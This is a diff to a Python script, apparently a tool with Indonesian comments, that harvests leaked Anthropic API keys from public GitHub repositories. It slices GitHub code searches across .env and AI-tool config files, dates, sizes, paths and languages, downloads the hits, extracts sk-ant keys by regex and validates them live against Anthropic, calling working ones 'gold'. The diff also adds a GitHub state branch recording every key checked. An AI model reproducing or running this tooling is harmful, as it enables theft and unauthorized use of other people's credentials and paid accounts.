@@ -149,60 +149,105 @@ def validate_claude_live(key):
         return False, str(e)
     return False, "Failed"
 
-def load_vault():
-    vault_file = "claude_vault.json"
-    if os.path.exists(vault_file):
-        try:
-            with open(vault_file, "r") as f:
-                data = json.load(f)
-                return set(x.get("token") for x in data if "token" in x), data
-        except Exception:
-            pass
-    return set(), []
+CLAUDE_SEEN_FILE = "claude_scanned_tokens.json"
 
-def save_vault(new_gold):
-    vault_file = "claude_vault.json"
-    _, existing = load_vault()
-    existing_tokens = set(x.get("token") for x in existing)
-    for g in new_gold:
-        if g.get("token") not in existing_tokens:
-            existing.append(g)
-            existing_tokens.add(g.get("token"))
-    with open(vault_file, "w") as f:
-        json.dump(existing, f, indent=2)
+def load_vault():
+    """Memuat daftar seluruh token Claude yang SUDAH PERNAH discan dari branch 'state'."""
+    seen_tokens = set()
+    sha = None
+    tok = get_next_gh_token()
+    if not tok:
+        return seen_tokens, sha
+    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
+    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
+    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{CLAUDE_SEEN_FILE}?ref=state"
+    headers = {"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github.v3+json", "User-Agent": "CiroClaudeVault"}
+    try:
+        import base64
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, timeout=15) as resp:
+            data = json.loads(resp.read().decode())
+            sha = data.get("sha")
+            raw_content = base64.b64decode(data.get("content", "")).decode("utf-8")
+            arr = json.loads(raw_content)
+            for item in arr:
+                seen_tokens.add(item)
+            print(f"📦 Database Histori Termuat: {len(seen_tokens)} token Claude sudah pernah diperiksa sebelumnya (ANTI-DUPLIKASI).")
+    except Exception:
+        print("ℹ️ Database histori token Claude baru dimulai.")
+    return seen_tokens, sha
+
+def save_vault(all_checked_tokens):
+    """Menyimpan seluruh token Claude yang sudah diperiksa ke branch 'state' agar tidak pernah dicek ulang."""
+    tok = get_next_gh_token()
+    if not tok or not all_checked_tokens:
+        return
+    import base64
+    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
+    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
+    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{CLAUDE_SEEN_FILE}"
+    headers = {"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github.v3+json", "User-Agent": "CiroClaudeVault"}
+    
+    seen_tokens, sha = load_vault()
+    seen_tokens.update(all_checked_tokens)
+    
+    dumped = json.dumps(sorted(list(seen_tokens)), indent=2).encode("utf-8")
+    content_b64 = base64.b64encode(dumped).decode("utf-8")
+    payload = {
+        "message": f"update claude seen history: {len(seen_tokens)} total tokens checked",
+        "content": content_b64,
+        "branch": "state"
+    }
+    if sha:
+        payload["sha"] = sha
+    try:
+        req = urllib.request.Request(url, data=json.dumps(payload).encode("utf-8"), headers=headers, method="PUT")
+        with urllib.request.urlopen(req, timeout=20) as resp:
+            print(f"💾 Sukses sinkronisasi {len(seen_tokens)} token ke branch 'state'!")
+    except Exception as e:
+        print(f"⚠️ Gagal sinkronisasi histori ke state branch: {e}")
 
 def main():
     slices = [
-        # Irisan Ekstensi & Nama File Kunci
-        "filename:.env ANTHROPIC_API_KEY sk-ant",
-        "filename:.env CLAUDE_API_KEY sk-ant",
+        # 1. Irisan File & Config AI Coding Tools
+        "filename:cline_mcp_settings.json ANTHROPIC_API_KEY",
+        "filename:.aider.conf.yml ANTHROPIC_API_KEY",
+        "filename:mcp.json ANTHROPIC_API_KEY",
         "filename:.env.local ANTHROPIC_API_KEY sk-ant",
         "filename:.env.development ANTHROPIC_API_KEY sk-ant",
         "filename:.env.production ANTHROPIC_API_KEY sk-ant",
-        "filename:cline_mcp_settings.json ANTHROPIC_API_KEY",
-        "filename:mcp.json ANTHROPIC_API_KEY",
-        "filename:.aider.conf.yml ANTHROPIC_API_KEY",
         "filename:config.json ANTHROPIC_API_KEY sk-ant",
-        
-        # Irisan Berdasarkan Ukuran File (Tembus batas 1000)
-        "filename:.env ANTHROPIC_API_KEY size:<150",
-        "filename:.env ANTHROPIC_API_KEY size:150..400",
-        "filename:.env ANTHROPIC_API_KEY size:400..800",
-        "filename:.env ANTHROPIC_API_KEY size:800..1500",
-        "filename:.env ANTHROPIC_API_KEY size:1500..3000",
-        "filename:.env ANTHROPIC_API_KEY size:>3000",
-        
-        # Irisan Path Proyek Developer
+        "filename:.env CLAUDE_API_KEY sk-ant",
+
+        # 2. Irisan Rentang Tanggal Push/Update (Kuras Sisa 30.000 Kolam GitHub!)
+        "filename:.env ANTHROPIC_API_KEY pushed:>2025-01-01",
+        "filename:.env ANTHROPIC_API_KEY pushed:2024-07-01..2024-12-31",
+        "filename:.env ANTHROPIC_API_KEY pushed:2024-01-01..2024-06-30",
+        "filename:.env ANTHROPIC_API_KEY pushed:2023-06-01..2023-12-31",
+        "filename:.env ANTHROPIC_API_KEY pushed:2023-01-01..2023-05-31",
+
+        # 3. Irisan Ukuran File Ekstra Rapat
+        "filename:.env ANTHROPIC_API_KEY size:<100",
+        "filename:.env ANTHROPIC_API_KEY size:100..250",
+        "filename:.env ANTHROPIC_API_KEY size:250..500",
+        "filename:.env ANTHROPIC_API_KEY size:500..1000",
+        "filename:.env ANTHROPIC_API_KEY size:1000..2500",
+        "filename:.env ANTHROPIC_API_KEY size:>2500",
+
+        # 4. Irisan Folder Backend & Server
         "path:server ANTHROPIC_API_KEY sk-ant",
         "path:backend ANTHROPIC_API_KEY sk-ant",
         "path:src ANTHROPIC_API_KEY sk-ant",
         "path:api ANTHROPIC_API_KEY sk-ant",
         "path:app ANTHROPIC_API_KEY sk-ant",
-        
-        # Irisan Bahasa Pemrograman
+        "path:services ANTHROPIC_API_KEY sk-ant",
+
+        # 5. Irisan Bahasa Pemrograman
         "language:Python ANTHROPIC_API_KEY sk-ant",
         "language:TypeScript ANTHROPIC_API_KEY sk-ant",
         "language:JavaScript ANTHROPIC_API_KEY sk-ant",
+        "language:Go ANTHROPIC_API_KEY sk-ant",
+        "language:Rust ANTHROPIC_API_KEY sk-ant",
         "language:YAML ANTHROPIC_API_KEY sk-ant",
         "language:JSON ANTHROPIC_API_KEY sk-ant",
     ]
@@ -250,21 +295,23 @@ def main():
 
     print(f"📥 Berhasil menyedot {len(downloaded_files)} file mentah!")
 
-    # Ekstraksi Token Claude Unik
+    # Ekstraksi Token Claude Unik (100% Anti-Periksa Ulang dari Riwayat)
     known_vault_tokens, _ = load_vault()
     extracted_tokens = []
     seen_tokens = set(known_vault_tokens)
+    current_run_seen = set()
 
     for src, text in downloaded_files.items():
         matches = CLAUDE_REGEX.findall(text)
         for m in matches:
             if any(x in m.lower() for x in ["example", "your_key", "xxxx", "dummy", "placeholder", "changeme"]):
                 continue
+            current_run_seen.add(m)
             if m not in seen_tokens:
                 seen_tokens.add(m)
                 extracted_tokens.append((m, src))
 
-    print(f"🎯 Ditemukan {len(extracted_tokens)} kandidat kunci Claude unik baru!")
+    print(f"🎯 Ditemukan {len(extracted_tokens)} kandidat kunci Claude unik BARU (belum pernah diperiksa sebelumnya)!")
 
     # Validasi Live ke Anthropic
     print("🧪 Memvalidasi status live kunci Claude langsung ke Anthropic API...")
@@ -286,8 +333,9 @@ def main():
 
     print(f"\n🏆 SELESAI! Ditemukan {len(active_gold)} KUNCI EMAS CLAUDE AKTIF!")
 
-    if active_gold:
-        save_vault(active_gold)
+    # Simpan SEMUA token yang sudah diperiksa ke state branch agar run berikutnya TIDAK AKAN PERNAH memeriksa ulang!
+    if current_run_seen:
+        save_vault(current_run_seen)
 
     report_file = "findings_claude_gold.json"
     with open(report_file, "w", encoding="utf-8") as f:
